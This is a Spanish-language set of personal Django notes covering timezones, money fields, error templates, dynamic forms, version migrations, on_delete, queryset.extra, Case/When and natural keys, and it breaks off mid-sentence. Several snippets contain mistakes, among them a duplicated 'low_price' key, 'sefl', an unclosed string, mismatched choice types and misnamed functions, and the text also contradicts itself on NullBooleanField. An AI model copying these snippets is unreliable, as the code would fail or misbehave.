Django
========================================================================

.. tags:: vim, django, database, development, python


Cómo obtener la fecha o *timestamp* en Django, con el *timezone* correcto
-------------------------------------------------------------------------

Si en el ``settings.py`` tenemos definido la zona horaria (lo cual es
totalmente recomendado, ``USE_TZ = True``), esta es la forma correcta de
obtener fechas y *timestamps*.

Para obtener un timestamp:

.. code:: python

   from django.utils import timezone

   timezone.now()

Para obtener la fecha:

.. code:: python

   from django.utils import timezone

   timezone.now().date()


Usar ``DecimalField`` para almacenar cantidades de dinero
---------------------------------------------------------

**Nunca se debe usar un campo** ``FloatField`` **para almacenar información
sobre cantidades de dinero**. Usa ``DecimalField`` mejor. Otras opciones
habituales para evitar perdidas por redondeo es usar enteros y almacenar
las cantidades como céntimos, centavos, peniques, etc.

Como representar números con comas, por ejemplo, dineritos, en Django
---------------------------------------------------------------------

La librería nativa de Django ``django.contrib.humanize`` tiene filtros
para esto:

.. code:: html

   {% load humanize %}
   {{ my_num|intcomma }}

Si no funciona, verifica que ``django.contrib.humanize`` este en la
variable ``INSTALLED_APPS`` del ``settings.py``.

Fuente: `python - Format numbers in django templates - Stack
Overflow <https://stackoverflow.com/questions/346467/format-numbers-in-django-templates>`__

Manejador de error por defecto
------------------------------

Merece la pena leer la documentación sobre los manejadores de error
predefinidos: ``page_not_found``, ``server_error``,
``permission_denied`` y ``bad_request``. Estas funciones usan por
defecto las siguientes plantillas, respectivamente: ``404.html``,
``500.html``, ``403.html``, y ``400.html``.

.. warning:: Solo se verán estas plantillas en modo de desarrollo

   Si la variable `DEBUG` está a `True`, no se muestras estas
   plantillas, sino la plantilla general de errores de Django.

Si simplemente queremos páginas de error molonas, solo hay que crear
plantillas con estos nombres en alguno de los sitios que Django usa para
buscar plantillas, es decir, lo que haya definido en la variable
``TEMPLATE_DIRS``. No hay necesidad de tocar la configuración de URL.

Hay más documentación en `Customizing Error
Views <https://docs.djangoproject.com/en/4.2/topics/http/views/#customizing-error-views>`__,
especialmente para saber que variables de contexto están disponibles.

Para errores 404, la vista por defecto es ``page_not_found()``, definida
en ``django.views.defaults``, que carga la plantilla ``404.html``. A la
plantilla se le pasan dos valores, ``request_path``, que es la URL en la
que se produjo el error, y ``exception``, que es una representación de
la Excepción original que produjo el error, por lo que contiene el
mensaje que se uso para crearla.

Aparte de esas variables, la plantilla tiene acceso al objeto
``request``, así como a cualquier valor definido en los procesadores de
contexto.

Desde Django 1.10, los errores por defecto de tipo *CSRF* usan la
plantilla ``403_csrf.html``.

Los errores de tipo 500, *server error*, se gestionan por defecto en la
vista ``server_error()``, definida también en ``django.views.defaults``.
Usa por defecto la plantilla ``500.html``. A diferencia de los errores
``4xx``, aquí no se pasa ningún parámetro, y el contexto está vacío,
para minimizar la posibilidad de un nuevo error.

Cómo hacer una formulario dinámicamente
---------------------------------------

.. note:: TL/DR Añadir o cambiar los campos definidos en el formulario
          durante la inicialización del mismo, usando el atributo
          ``fields``.

   Cada instancia de ``Form`` tiene este atributo ``fields``, que es un
   diccionario que mantiene referencias a todos los campos definidos en
   la declaración de la clase. Al ser un diccionario, puede ser
   modificado sin problemas en la llamada a ``__init__``.

Por ejemplo, supongamos que queremos añadir un campo de tipo
``Checkbox`` pero solo si al crear el formulario usamos un parámetro por
nombre ``upgrade`` a ``True``:

.. code:: python

   class PersonDetailsForm(forms.Form): 
       name = forms.CharField(max_length=100) 
       age = forms.IntegerField() 

       def __init__(self, *args, **kwargs): 
           upgrade = kwargs.pop("upgrade", False) 
           super().__init__(*args, **kwargs) 

           # Show first class option? 
           if upgrade: 
               self.fields["first_class"] = forms.BooleanField( 
                   label="Fly First Class?",
                   ) 

.. warning:: El parámetro nuevo debe ser eliminado de ``kwargs``

   El nuevo parámetro por nombre debe ser eliminado del diccionario `kwargs`
   antes de llamar a `super().__init__`.

.. note:: Si usamos la clase ``FormView``

   si usamos la CBV `FormView`, pasaríamos el parámetro sobreescribiendo
   el método `get_form_kwargs`. 

Puede usarse también para modificar los atributos de los campos
predefinidos, como el *widget* a usar o el texto de ayuda.

Fuente: El libro `Django Design Patterns and Best
Practice <https://www.packtpub.com/product/django-design-patterns-and-best-practices-second-edition/9781788831345>`__


Como resolver el problema de conflicto de nombres entre *apps*
---------------------------------------=====---------------------------

Con los cambios en Django 1.7, es obligatorio que cada ``app`` tenga una
etiqueta o *label* **única**. El valor por defecto de esta etiqueta es
el nombre del paquete, así que si tienes dos *apps* con el mismo nombre
en diferentes ramas del sistema de ficheros, dará un error (*Application
labels aren’t unique*, etc.)

La solución es sobreescribir la etiqueta por defecto, en el modelo
derivado de ``AppConfig``, en el fichero ``apps.py``:

.. code:: Python

   # foo/apps.py

   from django.apps import AppConfig

   class FooConfig(AppConfig):
       name = 'full.python.path.to.your.app.foo'
       label = 'my.foo'  # Esta es la línea importante. POr defecto sería `foo`


Fuente: `StackOverflow - How to resolve
“django.core.exceptions.ImproperlyConfigured: Application labels aren’t
unique, duplicates: foo” in Django
1.7? <https://stackoverflow.com/questions/24319558/how-to-resolve-django-core-exceptions-improperlyconfigured-application-labels>`__


Cómo enlazar a la página de un modelo en el admin
------------------------------------------------------------------------

Se puede hacer una inversión de la URL con:

.. code:: python

   reverse('admin:app_model_change', kwargs={'object_id': pk})

Donde ``app`` es la etiqueta de la app, y ``model`` el nombre del
modelo, y ``pk`` es la clave primaria del objeto.


Cómo migrar a 3.1.1
------------------------------------------------------------------------

**NullBooleanField** está obsoleto, ha sido reemplazado por
   ``BooleanField(null=True)``

Tanto ``load staticfiles`` como ``load admin_static`` están obsoletos desde
Django 2.1, deprecado en Django 3.0.

Cambiar este tipo de referencias en las plantilla:

.. code:: django

   {% load staticfiles %}
   {% load static from staticfiles %}
   {% load admin_static %}

a:

.. code:: django

   {% load static %}


Como migrar a 4.xx
------------------------------------------------------------------------

Ya no se puede usar la funcion ``url`` para especificar patrones, hay
que usar obligatoriamente ``path`` o ``path_re``.

Si da problemas con CSRF, hay que añadir la siguiente variable al
``settings.py``:

.. code:: python

   CSRF_TRUSTED_ORIGINS = [
           'https://subdomain.example.com',
           'https://*.blob.com',
           ...
       ]

Por defecto es una lista vacía. Los valores en las versiones
anteriores a la 4 puede que estuvieran sin el esquema, y seguramente
sin poder usar asteriscos.

Fuente: `CSRF_TRUSTED_ORIGINS - Django
   settings <https://docs.djangoproject.com/en/4.0/ref/settings/#csrf-trusted-origins>`__

Cómo migrar a 6.xx
------------------------------------------------------------------------

Since Django’s inception, the web has gradually moved from HTTP to
HTTPS, a welcome move for security. But the history has meant older
parts of Django have had a lingering HTTP bias. Many of these have been
migrated to default to HTTPS instead in previous versions. Django 5.0
starts the migration of another, tiny HTTP bias in forms.URLField.

The old behaviour: when URLField is provided a URL without a scheme, it
assumes it to be “http”:

.. code:: python

   from django import forms

   assert forms.URLField().to_python('example.com') == 'http://example.com'

Django 5.0 has started a deprecation process to change this default to
"https"

Here’s that warning message in a more readable format:

   RemovedInDjango60Warning: The default scheme will be changed from
   ‘http’ to ‘https’ in Django 6.0. Pass the
   ``forms.URLField.assume_scheme argument`` to silence this warning, or
   set the ``FORMS_URLFIELD_ASSUME_HTTPS`` transitional setting to True
   to opt into using ‘https’ as the new default scheme.

Django 5.1 lo trata como un ``DeprecationWarning`` pero en Django 6.0
cambiará el valor por defecto y eliminara el aviso.

Hasta Django 6.0, seguirá existiendo el aviso. Esto se puede controlar
de dos maneras:

-  Adoptar el comportamiento futuro con el valor de configuración
   ``FORMS_URLFIELD_ASSUME_HTTPS``.

   ::

      FORMS_URLFIELD_ASSUME_HTTPS = True

   Esto hará que **todos** los campos de tipo URLField asumen que el
   esquema por defecto es ``https``.

-  Migrar individualmente los campos de tipo ``forms.URLField``
   añadiendo el esquema por defecto.

   Con esta opcion, hay que aãdir el parámetro opcional
   ``assume_schema`` a cada instancia de ``URL Field``. Se puede ajustar
   el valor a ``https``, que el el comportamiento futuro por defecto, o
   ``http`` para mantener el comportamiento anterior.

De cualquiera de las dos maneras desactivaremos el aviso.

Fuente: `Django: Fix version 5.0’s URLField.assume_scheme warnings -
Adam
Johnson <https://adamj.eu/tech/2023/12/07/django-fix-urlfield-assume-scheme-warnings/>`__

Configurar VIM para trabajar con plantillas de Django
-----------------------------------------------------

Escribir ``:setfiletype htmldjango`` para que Vim resalte
automáticamente las plantillas Django. Si solo se quiere resaltado de
las etiquetas de Django pero no de HTML, hay que usar
``:setfiletype django``.

Fuente: `Syntax highlighting for django
templates <https://www.vim.org/scripts/script.php?script_id=1487>`__

Valores del parámetro ``on_delete`` en los campos de modelos
------------------------------------------------------------------------

Este es el comportamiento a adoptar cuando se borra un objeto de la base
de datos que está referenciado desde otra parte. Esto es parte del
estándar SQL, no de Django.

Hay 6 acciones posibles que se pueden tomar:

-  ``CASCADE``: Cuando se borra el objeto referenciado, también se
   borran todos los objetos que tienen una referencia a él. Por ejemplo,
   al borrar un artículo de un *Blog*, se borrarían también todos los
   comentarios del mismo. En SQL se usa la misma palabra clave,
   ``CASCADE``.

-  ``PROTECT``: Impide el borrado, mientras existan objetos que lo
   referencien. Habría que borrar a mano los comentarios para poder
   borrar el articulo, si seguimos con el ejemplo anterior. La palabra
   clave SQL es ``RESTRICT``.

-  ``SET_NULL``: Pone a nulo las referencias externas (Lo que exige que
   el campo acepte el valor nulo). Por ejemplo, al borrar a un usuario
   del *Blog*, dejar los comentarios hechos por él pero como comentarios
   anónimos o hechos por un usuario borrado. En SQL es igual,
   ``SET NULL``.

-  ``SET_DEFAULT``: Similar al anterior, pero en vez de nulo se usa el
   valor por defecto, si está definido. En SQL es igual,
   ``SET DEFAULT``.

-  ``SET(...)``: Similar a los dos anteriores, pero se define el valor a
   usar. Este modo no existe en el estándar SQL, es gestionado
   enteramente por Django.

-  ``DO_NOTHING``: Probablemente una muy mala idea, ya que romperá la
   integridad referencial en la base de datos. En SQL se usa
   ``NO ACTION``.

En la mayoría de los casos se podría usar ``CASCADE``, pero siempre es
recomendable pensar que caso nos viene mejor para cada clave foránea.
Las opciones ``PROTECT`` y ``SET NULL`` son las dos siguientes más
usadas. El problema de ``CASCADE`` es que puede ocasionar un borrado
masivo en cascada con un solo ``DELETE``, si hemos cometido un error en
el diseñó.

A modo de explicación adicional para el caso más complicado, el
``CASCADE``:

-  “¡No, por favor! ¡No lo hagas, te necesito!” (Que se correspondería
   con la opción ``PROTECT``.

-  “¡Pues muy bien, si no soy tuyo, no soy de nadie!” (Que se
   corresponde con ``SET_NULL``.

-  “¡Adiós, mundo cruel, si tu te vas, me voy contigo!” y a continuación
   se suicida. Corresponde con el borrado en cascada ``DELETE``.

-  “¡Pues pírate, me iré con Menganito/a!”. Equivale a ``SET_DEFAULT``,
   o ``SET(...)``.

-  “¡Me niego a aceptar la realidad! ¡Seguirá hablando contigo y
   actuando como si no hubiera pasado nada!”. Claro ejemplo de
   ``DO_NOTHING``.

Fuente: `Best practices working with Django
models <https://steelkiwi.com/blog/best-practices-working-django-models-python/>`__

Cómo hacer formularios múltiples, divididos en varias páginas
------------------------------------------------------------------------

Hay que usar una *app* externa,
`django-formtools <https://github.com/django/django-formtools/>`__.

Esta *app* solía ser parte de la distribución estándar de Django, pero a
partir de Django 1.8 se distribuye como una *app* separada. Usa la clase
```WizardView`` <https://django-formtools.readthedocs.io/en/latest/wizard.html>`__,
y el mecanismo de uso es:

-  Añadir ``formtools`` a la variable ``INSTALLED_APPS``.

-  Definimos una serie de formularios, instancias de ``Form``, uno para
   cada página del *wizard*.

-  Creamos una subclase de ``WizardView``, que especifica lo que tenemos
   que hacer cuando **todos** los formularios anteriores hayan sido
   presentados y validados.

-  Creamos plantillas para presentar los formularios. Se puede usar una
   única plantilla genérica para todos los formularios o usar plantillas
   especificas para cada uno de los formularios.

-  Apuntar la ruta que queremos para el formulario inicial al método
   ``as_view()`` de la clase derivada de ``WizardView``.

Cómo usar el método ``extra`` de los queryset para consultas avanzadas
------------------------------------------------------------------------

El método ``extra`` de los ``queryset`` nos permite realizar algunas
modificaciones en las sentencias SQL que ejecuta. En concreto nos
permite añadir campos a la cláusula ``SELECT``, o tablas y *joins* a la
cláusula ``FROM``, o condiciones a la cláusula ``ORDER BY``.

Supongamos, por ejemplo, que tenemos una tabla de productos a la venta:

.. code:: python

   class Item(Model):
       id = AutoField(primary_key=True)  # Me gusta especificar la clave
       descripcion = CharField(max_length=200)
       pvp = DecimalField(max_digits=12, decimal_places=2)
       alta = DateTimeField(auto_now_add=True)

Podemos añadir un campo calculado que nos indique si los precios son
inferiores a 5.0 (quizá queremos marcar estos productos en la página con
un icono ``low-price``, por ejemplo). Para ello, podemos añadir un campo
calculado al ``SELECT`` de la *query* usando ``extra``, como en el
siguiente ejemplo:

.. code:: python

   Item.objects.extra(select={'low_price':'pvp < 5.0'}).all()

Fuente: `Best practices working with Django
models <https://steelkiwi.com/blog/best-practices-working-django-models-python/>`__

Lo que estamos haciendo es que la sentencia SQL generada por Django pase
de esto:

.. code:: sql

   SELECT app_item.*
     FROM app_item;

a:

.. code:: sql

   SELECT app_item.*, (pvp < 5.0) AS low_price
     FROM app_item;

Podemos pasar varios campos calculados en el diccionario especificado
por el parámetro ``SELECT``, o hacer varias llamadas a extra. Por
ejemplo, si queremos clasificar los precios en tres bandas, (baratos,
por debajo de 5 euros; medios, entre 5 y 100 euros y caros, por encima
de 100 euros), podemos hacerlos así:

.. code:: python

    Item.objects.extra(select={
        'low_price':'pvp < 5.0',
        'mid_price':'pvp between 5.0 and 100.0',
        'low_price':'pvp > 100.0',
        }).all()

O:

.. code:: python

    Item.objects  \
        .extra(select={'low_price':'pvp < 5.0'})  \
        .extra(select={'mid_price':'pvp between 5.0 and 100.0'}) \
        .extra(select={'low_price':'pvp > 100.0'})  \
        .all()

El resultado debería ser el mismo en los dos casos.

Es verdad que podemos realizar este calculo de bandas de precios en un
método de la clase ``Item``, pero en ocasiones puede ser útil o
necesario que **determinadas operaciones las haga la base de datos por
nosotros**.

Obviamente también podemos pasar subconsultas como campo añadido al
select, que nos da aun más posibilidades. Por ejemplo, supongamos que en
nuestra aplicación tiene otro modelo con las puntuaciones que nuestros
clientes asignan a nuestros artículos, algo como esto:

.. code:: python

   class Score(models.Model):
       id = AutoField(primary_key=True)  # Si, ya lo sé, no hace falta...
       item = ForeignKey(Item)
       rate = SmallIntegerField()

Podemos realizar una consulta sobre artículos e incorporar la puntuación
media de cada uno, calculada directamente por el gestor de la base de
datos:

.. code:: python

   Item.objects.extra(select={
       'mean_rate':'''
           SELECT AVG(app_score.rate)
           FROM app_score
           WHERE app_score.item_id = app_item.id
           '''
       }).all()

Si quisiéramos hacerlo desde Django, con un método de la clase ``Item``,
por ejemplo, tendríamos que realizar primero una consulta para obtener
todas las puntuaciones de un artículo, y luego calcular la media.

Si lo hacemos para una consulta cuyo resultado final fueran 10
artículos, por ejemplo, se ejecutan 11 consultas SQL a la base de datos,
teniendo además que hacer el cálculo nosotros, contra una sola consulta,
y los cálculos los realiza el gestor de la base de datos por nosotros.
La diferencia en rendimiento puede ser considerable a medida que se
incremente el número de artículos.

Estás prácticas también tienen un cierto riesgo: hemos vinculado más
nuestro código al gestor de base de datos que estamos usando, con las
dependencias y peligro que eso conlleva. Si usamos extensiones
propietarias de la base de datos para realizar la consulta, aunque sea
algo tan simple como utilizar la marca de tiempo de la base de datos
(Que cada gestor se empeña en definir de forma diferente, ``sysdate`` en
Oracle, ``now()`` en postgreSQL, ``current_timestamp`` en Microsoft SQL
Server, por citar solo unos pocos ejemplos), ya tenemos un punto de
ruptura si pretendemos migrar de gestor.

En cualquier caso, es útil saber que tenemos esta capacidad, ya depende
de nosotros si queremos emplearla o no. Recuerda solo estos tres
consejos:

-  Explícito mejor que implícito (Tim Peters)

-  Los casos especiales no son tan especiales como para romper las
   reglas… Pero lo práctico vence a lo ideal (Tim Peters)

-  Un gran poder conlleva también una gran responsabilidad (Stan Lee)

Nota: El uso de extra para modificar las cláusulas ``FROM`` y ``WHERE``
está explicado, junto con muchas otras cosas interesantes, en la
documentación oficial: `Django Query Set API reference -
extra <https://docs.djangoproject.com/en/3.1/ref/models/querysets/#extra>`__.

Como hacer un CASE de base de datos usando el ORM de Django
-----------------------------------------------------------

Lo primero es saber como se usa las expresiones condicionales en SQL.
Las expresiones condicionales son una especia de mezcla entre las
sentencias ``if ... elif ... else`` y ``case``.

En SQL, la forma general de una sentencia ``Case`` es la siguiente:

.. code:: sql

   CASE
       WHEN condition1 THEN result1
       WHEN condition2 THEN result2
       WHEN conditionN THEN resultN
       ELSE result
   END;

En Django, usaremos un objeto de la clase **``When``** para incluir los
diferentes casos a considerar. Funciona de forma similar a ``.filter``,
añadiendo varias instancias de objetos ``When`` en una clase ``Case``.

Se pueden usar en filtros, anotaciones (``annotate``), agrupaciones
(``aggregations``) y actualizaciones. Funciona evaluando una serie de
condiciones, para cada fila de la tabla, y devolviendo la primera que se
resuelva correctamente.

Vamos a usar el siguiente modelo como ejemplo:

.. code:: python

   from django.db import models

   class Client(models.Model):
       REGULAR = 'R'
       GOLD = 'G'
       PLATINUM = 'P'
       ACCOUNT_TYPE_CHOICES = [
           (REGULAR, 'Regular'),
           (GOLD, 'Gold'),
           (PLATINUM, 'Platinum'),
       ]
       name = models.CharField(max_length=50)
       registered_on = models.DateField()
       account_type = models.CharField(
           max_length=1,
           choices=ACCOUNT_TYPE_CHOICES,
           default=REGULAR,
       )

Algunos ejemplos de ``When``:

.. code:: python

   from django.db.models import F, Q, When

   # String arguments refer to fields; the following two examples are equivalent:
   When(account_type=Client.GOLD, then='name')
   When(account_type=Client.GOLD, then=F('name'))

   # You can use field lookups in the condition
   from datetime import date

   When(registered_on__gt=date(2014, 1, 1),
           registered_on__lt=date(2015, 1, 1),
           then='account_type')

   # Complex conditions can be created using Q objects
   When(Q(name__startswith="John") | Q(name__startswith="Paul"),
           then='name')

   # Condition can be created using boolean expressions.
   from django.db.models import Exists, OuterRef
   non_unique_account_type = Client.objects.filter(
       account_type=OuterRef('account_type'),
   ).exclude(pk=OuterRef('pk')).values('pk')
   When(Exists(non_unique_account_type), then=Value('non unique'))

Una expresión ``Case`` usa varios objetos ``When()``, que son
evaluados por orden.Cuando uno de ellos se evalúa como verdadero, se
devolverá el valor correspondiente.

Un ejemplo:

.. code:: python

   from datetime import date, timedelta
   from django.db.models import Case, CharField, Value, When

   # Get the discount for each Client based on the account type
   Client.objects.annotate(
       discount=Case(
           When(account_type=Client.GOLD, then=Value('5%')),
           When(account_type=Client.PLATINUM, then=Value('10%')),
           default=Value('0%'),
           output_field=CharField(),
       ),
   ).values_list('name', 'discount')
   <QuerySet [('Jane Doe', '0%'), ('James Smith', '5%'), ('Jack Black', '10%')]>

La clase ``Case()`` acepta cualquier número de objetos de tipo
``When()`` como parámetros posicionales. También hay parámetros por
nombre para determinadas facilidades. Por ejemplo, ``default`` para
definir el valor a usar si ninguna de las condiciones ``When()`` evalúa
a verdadero. Si no se proporciona un valor por defecto, se devuelve
``None``.

Fuentes:

-  `Conditional
   expressions <https://docs.djangoproject.com/en/3.1/ref/models/conditional-expressions/>`__

-  `Best practices working with Django
   models <https://steelkiwi.com/blog/best-practices-working-django-models-python/>`__

-  `SQL CASE Expression <https://www.w3schools.com/sql/sql_case.asp>`__

Nomenclatura correcta de los modelos
------------------------------------

En general se recomienda usar **nombres en singular para los modelos**,
como ``Project``, ``Task``, ``Place``.

Nombres de los campos usados para enlazar modelos, como ForeignKey y otros
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para campos que relacionan con otros modelos, como ``ForeignKey``,
``OneToOneKey``, ``ManyToMany``, hay una serie de cuestiones
importantes.

Cómo usar el atributo ``related_name``, y porqué es recomendable usarlo
-----------------------------------------------------------------------

Cunado creamos una *foreign key* en un modelo, esto crea automáticamente
un atributo **el el modelo enlazado**. Podemos indicar cual será el
nombre del atributo usando el parámetro ``related_name``. Normalmente,
es suficiente con el nombre en plural del modelo que contiene la
``ForeignKey``.

Por ejemplo:

.. code:: python

   class Owner(models.Model):
       name = CharField(max_length=128)

   class Comic(models.Model):
       owner = models.ForeignKey(Owner, related_name='comics')

Ahora las instancias de ``Owner`` tienen un atributo ``comics``, que es
un *queryset* de todos los comics que posee dicha instancia.

Si no usamos el parámetro, el atributo se crea, pero con el nombre por
defecto de ``<model>_set``, en este caso, ``comic_set``. El problema es
que se crea *mágicamente*, y puede confundir a un programador que ve que
se usa el atributo ``comic_set`` pero que no se define en ninguna parte
del código. Esto va contra el principio *Explicit is better than
implicit*, y es por lo que se recomienda el uso, para tener un nombre
**más claro y definido en el código**.

Porqué no hay que usar nunca una ``ForeignKey`` con ``unique=True``
-------------------------------------------------------------------

No tiene sentido usar esta combinación, ya que existe ``OneToOneField``
precisamente para estos casos.

Orden de los atributos y métodos declarados en un modelo.
---------------------------------------------------------

Este sería el orden recomendado:

1)  Clase ``meta``

2)  Constantes (para usar en ``choices`` y otras)

3)  Campos del modelo

4)  *Managers* personalizados, si los hubiera

5)  Definición del método ``__str__``

6)  Otros métodos especiales

7)  Definición del método ``clean``

8)  Definición del método ``save``

9)  Definición del método ``get_absolut_url``

10) Otros métodos


Desnormalización de la base de datos
------------------------------------------------------------------------

En general, hay que evitar el uso de campos o tablas desnormalizadas,
pero a veces, normalmente por razones de rendimiento, son necesarias.

Si la mayoría de la información necesita ser desnormalizada, podría ser
interesante estudiar el uso de una base de datos NoSQL. Si se
trata de solo unos pocos casos, puede ser interesante el uso del tipo
``JsonField``.


Nunca usar BooleanField con ``null`` o ``black``
------------------------------------------------------------------------

Nunca usar ``null=True`` o ``blank=True`` para campos ``BooleanField``.
En general es mejor especificar un valor por defecto que sea razonable.
Si no es posible o si fuera necesario dejar el valor vacío, usar
``NullBooleanField``.


Cómo usar el parámetro ``choices``
------------------------------------------------------------------------

Recomendaciones al usar el parámetro ``choices``:

-  Usar cadenas de texto como valores, en vez de números. Aunque quizá
   no sea la mejor opción desde el punto de vista de la eficiencia de la
   base de datos, por lo general facilita el desarrollo al tener
   opciones identificables a simple vista, por ejemplo a la hora de usar
   filtros.

-  Los valores no deberían cambiar, así que se deberían representar como
   constantes, por lo tanto, se recomienda escribirlos en mayúsculas.

-  Especificar las variantes antes de usarlas en el campo, ya sea como
   constantes externas o como constantes de la clase.

-  Si es una lista de estados, puede ayudar presentarlos en orden
   cronológico: (Por ejemplo ``nuevo``, ``en_proceso``, ``terminado``).

Puedes usar la clase ``Choices`` definida en la librería externa
`model_utils <https://django-model-utils.readthedocs.io/>`__, o si estás
en Django a partir de la versión :math:`3+`, usar enumeraciones:

.. code:: python

    from model_utils import Choices

    class Article(models.Model):
        STATUSES = Choices(
            (0, 'draft', _('draft')),
            (1, 'published', _('published'))
        )
        status = models.IntegerField(choices=STATUSES, default=STATUSES.draft)


¿Demasiadas valores booleanos en un modelo?
------------------------------------------------------------------------

Puede ser aconsejable reemplazar un conjunto de valores booleanos por un
campo de estado. Veamos el siguiente ejemplo:

.. code:: python

    class Article(models.Model):
        is_published = models.BooleanField(default=False)
        is_verified = models.BooleanField(default=False)

Si asumimos que la lógica de la aplicación es que un articulo empieza su
vida como no publicado y no verificado, luego es comprobado por un
revisor, y se marca como verificado si le da el visto bueno. Tras eso,
el editor puede publicar los artículos verificados, pasando a publicado.
El problema de este enfoque es que permite los llamados **estados
imposibles**, ya que solo hay tres estados, pero cuatro posibles
combinaciones de dos valores booleanos.

En este caso concreto, existe la posibilidad de tener un artículo
publicado pero no comprobado. En este caso, parece una mejor opción
tener un campo que acepte solo uno de los tres posibles estados:

.. code:: python

   class Article(models.Model):

       STATUSES = Choices('new', 'verified', 'published')

       status = models.IntegerField(choices=STATUSES, default=STATUSES.draft)

Obsérvese que es trivial implementar una propiedades que funciones como
en el modelo anterior, derivando su valor del estado, si tuviéramos
código que hiciera referencia a los atributos anteriores (Este ejemplo
usa el soporte para ``enum`` disponible desde Django 3.0):

.. code:: python

   from django.db import models


   class Article(models.Model):

       class STATUS(models.TextChoices):
           NEW = ('N', 'Nuevo)
           VERIFIED = ('V', 'Verificado')
           PUBLISHED = ('P', 'Publicado')

       status = models.IntegerField(choices=STATUS, default=STATUS.NEW)

       @property
       def is_published(self):
           return self.status == self.STATUS.PUBLISHED

       @property
       def is_verified(self):
           return self.status in {
               self.STATUS.VERIFIED,
               self.STATUS.PUBLISHED,
           }

No añadir nombres redundantes en los campos de un modelo
--------------------------------------------------------

A no ser que haya una buena razón, no se debe incluir información
redundante en el nombre de los campos del modelo. Por ejemplo, una tabla
``Usuario`` no debería tener un campo ``Usuario.usuario_estado``, basta
con ``Usuario.estado``. Muy rara vez vamos a referirnos a un campo de un
modelo sin que esté cualificado por la clase o por la instancia.

Los datos incorrectos NO deberían poder almacenarse en la base de datos
-----------------------------------------------------------------------

Si tiene sentido, es preferible usar ``PositiveIntegerField`` en vez de
``IntegerField``, porque así prevenimos que **datos incorrectos se
almacenen en la base de datos**. Ver Impedir estados imposibles. Por la
misma razón, hay que especificar siempre ``unique`` a ``True`` si tiene
sentido, y eliminar o reducir al mínimo los campos con ``required`` a
``False``.


Como hacer que Django trabaje con claves naturales (``natural keys``)
---------------------------------------------------------------------

Tldr: Para usar claves naturales o *natural keys*, hay que definir un
método ``natural_key`` en la clase Modelo, y un método
``get_by_natural_key`` en una clase *Manager* especializada para el modelo.

Si tenemos un valor o conjunto de valores que forman una **clave
candidata natural**, podemos crear un índice indicando que la
combinación de valores es única. Además, es conveniente usar el concepto
de
```natural_key`` <https://docs.djangoproject.com/fr/4.2/topics/serialization/#natural-keys>`__
para facilitar las migraciones. Una clave natural es una tupla de
valores que identifican un registro, de forma equivalente pero
alternativa a una clave primaria.

Para usarlo, debemos definir un gestor (``models.Manager``)
personalizado, y este gestor debe implementar una función
``get_by_natural_key``, que aceptará como parámetros los campos que
forman la clave natural. Supongamos que queremos usar como clave natural
el nombre y apellidos de una persona, podríamos hacer algo como:

.. code:: py

   class PersonManager(models.Manager):
       def get_by_natural_key(self, first_name, last_name):
           return self.get(first_name=first_name, last_name=last_name)

   class Person(models.Model):

       class Meta:
           constraints = [
               models.UniqueConstraint(
                   fields=["first_name", "last_name"],
                   name="unique_first_last_name",
               ),
           ]

       first_name = models.CharField(max_length=100)
       last_name = models.CharField(max_length=100)
       birthdate = models.DateField()

       objects = PersonManager()

       def natural_key(self):
           '''Se debe devolver una tupla con los valores de la clave
           natural, en el mismo orden es que las espera
           el método `get_by_natural_key` del Manager.
           '''
           return (self.first_name, sefl.last_name)

Al exportar, donde antes se usaría la clave primaria, ahora se usa la
clave natural:

.. code:: javascript

    ...
    {
        "pk": 1,
        "model": "store.book",
        "fields": {"name": "Mostly Harmless", "author": ["Douglas", "Adams"]},
    }
    ...

Cuando fuéramos a cargar este libro, Django usará el método
``get_by_natural_key`` con los parámetros ``["Douglas", "Adams"]`` para
localizar el autor, en vez de la clave primaria.

Además, tenemos que definir, en la propia clase del modelo, un método
que se debe llamar ``natural_key``, que debe devolver siempre una tupla
con los valores de la clave natural. En nuestro caso, una tupla con los
apellidos y nombre de la persona. De esta forma, cuando se llame a la
función ``serializers.serialize()``, se puede indicar el parámetro
``use_natural_foreign_keys=True`` o ``use_natural_primary_keys=True``.

Cuando especificamos ``use_natural_foreign_keys=True``, Django usará el
método ``natural_key()`` para seriallizar cualquier referencia como
clave foranea a objetos de la clase del modelo, en este caso,
``Person``.

Cuando especificamos ``use_natural_primary_keys=True``, Django **no**
proporcionara la clave primaria en los datos serializados, ya que esta
puede ser calculada a partir de los valores del objeto durante la
deserialización.

-  Fuente: `Serializing Django objects \| Django
   documentation <https://docs.djangoproject.com/en/4.2/topics/serialization/#natural-keys>`__

Cómo obtener el primer/último elemento de un modelo
---------------------------------------------------

Se puede usar el método
``ModelName.objects.earliest('created'/'earliest')`` en vez de usar
``order_by('created')[0]``. Ademas, se puede definir el campo
``get_latest_by`` en la clase ``Meta``, con lo cual podemos usar los
métodos ``latest`` y ``earliest`` sin necesidad de especificar los
campos por los que se realiza la ordenación.

Hay que tener cuidado porque tanto el método ``latest`` como
``earliest`` pueden devolver una excepción ``DoesNotExist``, en caso de
que la tabla estuviera vacía.

Nunca calcular el tamaño de un ``queryset`` con ``len``
-------------------------------------------------------

Nunca hay que usar ``len`` para calcular el numero de resultados de un
*queryset*; es preferible usar el método ``count``. El primer método
funciona, pero es mucho más costoso, porque implica ejecutar la
consulta, traerse **todos** los datos de la base de datos a memoria,
transformarlos a instancias de la clase apropiado, y luego contarlos. El
segundo método simplemente realiza la misma consulta a la base de datos
pero con ``SELECT COUNT(*) ...``, con lo que la base de datos hace todo
el trabajo por nosotros.

Si el número de elementos del *queryset* es elevado, la diferencia en
tiempo puede ser de varios ordenes de magnitud.

No usar munca ``if queryset``, es una mala idea
-----------------------------------------------

Nunca hay que usar una variable de tipo ``queryset`` como un booleano
directamente, es preferible usar ``queryset.exists()``. La razón es más
o menos la misma que en la nota anterior, es preferible que la base de
datos realice la consulta usando la sentencia ``EXISTS``, mucho más
rápido y más barato.

Considera usar el campo ``help_text`` como documentación
--------------------------------------------------------

Usar el campo ``help_text`` como parte de la documentación resulta muy
útil, ya que es accesible tanto para desarrolladores como para
administradores (Si usas el ``admin``).

No usar ``null=true`` a menos que realmente lo necesites
--------------------------------------------------------

-  ``null=True`` indica que la base de datos aceptará ``NULL``.

-  ``blank=True`` solo se usa en los formularios derivados
   automáticamente de este modelo, para saber si la validación debe
   comprobar que no falte el campo. En caso de que sea verdadero, el
   formulario considera valido los datos aunque no este definido ningún
   valor para este campo. **No tiene nada que ver con la base de
   datos**.

Para campos de texto, se recomienda usar como valor por defecto la
cadena de texto vacía: ``''``, y **no permitir el uso de ``NULL`` en la
